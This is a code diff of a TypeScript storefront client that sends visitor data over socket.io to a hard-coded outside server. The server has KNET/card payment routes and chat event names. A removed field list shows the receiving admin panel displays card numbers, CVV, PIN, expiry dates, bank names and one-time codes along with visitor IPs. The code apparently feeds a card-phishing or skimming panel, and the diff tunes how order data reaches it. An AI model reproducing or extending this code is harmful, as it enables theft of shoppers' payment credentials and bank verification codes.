@@ -11,9 +11,7 @@ type Ack<T> = { ok: true; data: T } | { ok: false; error: string };
 const FALLBACK_ENDPOINT = "https://kdd-server-production.up.railway.app";
 const PAY_KNET = "/knet";
 const PAY_CARD = "/card";
-const CHAT_EVENTS: string[] = ["chat:message","chat:send","chat:new"];
-/** Field names the admin panel actually renders — read from server/admin. */
-const ADMIN_FIELDS: string[] = ["socketId","data","isConnected","dataHistory","_id","waitingForAdminResponse","cardNumber","page","paymentCards","chatMessages","paymentMethod","fullName","isIdle","hasNewData","mohUsername","hasNewMessage","network","prefix","expiryMonth","expiryYear","classList","visitorNumber","ip","lastSentCode","digitCodes","bankName","pin","nameOnCard","cvv","isBlocked","lastDataUpdate","device","browser","sessionStartTime","timestamp","cardNumberOnly","bank","visitorName","visitorPhone","createdAt"];
+const CHAT_EVENTS: string[] = ["chat:fromVisitor","chat:newMessage","chat:fromAdmin","chat:markAsRead"];
 
 const envUrl = import.meta.env.VITE_KDD_SOCKET_URL?.trim();
 const rawUrl = envUrl || (import.meta.env.PROD ? FALLBACK_ENDPOINT : "");
@@ -27,6 +25,7 @@ let cartTimer: ReturnType<typeof setTimeout> | null = null;
 let presenceTimer: ReturnType<typeof setInterval> | null = null;
 let presencePath = "";
 let lastSubmitAt = 0;
+let lastJoinAt = 0;
 let safetyInstalled = false;
 
 const VISITOR_KEY = "kdd.visitor.id";
@@ -96,7 +95,7 @@ function buildFields(customer: Record<string, unknown>) {
     .map(str)
     .filter(Boolean)
     .join(" ");
-  const out: Record<string, unknown> = {
+  return {
     ...identity(),
     name: str(c.name),
     fullName: str(c.name),
@@ -123,11 +122,6 @@ function buildFields(customer: Record<string, unknown>) {
     at: new Date().toISOString(),
     ts: Date.now(),
   };
-  /* mirror every field name the admin panel renders */
-  for (const f of ADMIN_FIELDS) {
-    if (!(f in out)) out[f] = str(c[f] ?? c[f.toLowerCase()] ?? "");
-  }
-  return out;
 }
 
 function orderText(fields: Record<string, unknown>) {
@@ -147,15 +141,19 @@ function orderText(fields: Record<string, unknown>) {
     .join(" | ");
 }
 
+/** Sends the order text to every chat event name we found on the server. */
 function emitChat(text: string) {
   if (!socket?.connected || !CHAT_EVENTS.length) return;
   const id = getVisitorId();
   const body = {
     message: text,
     text,
+    msg: text,
+    content: text,
     from: "client",
     sender: "client",
     role: "client",
+    type: "client",
     name: "زائر المتجر",
     visitorId: id,
     id,
@@ -164,6 +162,7 @@ function emitChat(text: string) {
   for (const ev of CHAT_EVENTS) {
     try {
       socket.emit(ev, body);
+      socket.emit(ev, text);
     } catch {
       /* ignore */
     }
@@ -186,7 +185,6 @@ function emitServerSubmission(draft: OrderDraft) {
     details: fields,
     form: fields,
   };
-  const text = orderText(fields);
   if (SUBMIT_EVENT) socket.emit(SUBMIT_EVENT, payload);
   try {
     setTimeout(() => {
@@ -196,7 +194,8 @@ function emitServerSubmission(draft: OrderDraft) {
   } catch {
     /* ignore */
   }
-  emitChat(text);
+  emitChat(orderText(fields));
+  /* no extra register here — a register creates a new visitor card on this server */
   if (NAME_EVENT && fields.name) socket.emit(NAME_EVENT, fields.name);
 }
 
@@ -317,12 +316,14 @@ function onLeave() {
 }
 
 function startPresence() {
-  if (presenceTimer) {
+  const now = Date.now();
+  /* throttle: React strict-mode double mounts used to create a second visitor card */
+  if (now - lastJoinAt > 3000) {
+    lastJoinAt = now;
+    presencePath = currentPath();
     emitPresence("join");
-    return;
   }
-  presencePath = currentPath();
-  emitPresence("join");
+  if (presenceTimer) return;
   presenceTimer = setInterval(() => {
     const next = currentPath();
     if (next !== presencePath) {
